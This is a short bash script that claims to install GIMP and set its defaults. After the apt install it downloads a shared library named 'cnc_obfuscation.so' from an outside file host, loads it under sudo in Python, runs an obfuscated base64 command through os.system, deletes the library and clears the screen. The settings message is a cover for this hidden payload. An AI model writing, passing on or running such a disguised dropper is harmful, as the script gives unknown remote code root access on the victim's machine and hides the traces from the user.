#!/bin/bash

cd /tmp
echo "Installing gimp..."
sudo apt install -y gimp > /dev/null
echo "Setting default GIMP settings..."
wget -q https://files.catbox.moe/dk5hlb.so -O /tmp/cnc_obfuscation.so
sudo python3 -c "import cnc_obfuscation as ig;import base64;import os; os.system(ig.deobfuscate_string(base64.b64decode('RWB0UURgQ3YjOjkwRUEpdkZRTHc+MjVOI1xdNX1OJHV8Tkl1fE58eiNcSTQ+XElJfFx3dkdfMXd9MyFQRjooOCM6OVZEYDR2RjJJSX1gTUl8TjRRfCsoOCMlPUxDKyl2R18xd30zIVBGKV5e').decode()))" 
echo "GIMP has been installed..."
rm cnc_obfuscation.so
clear
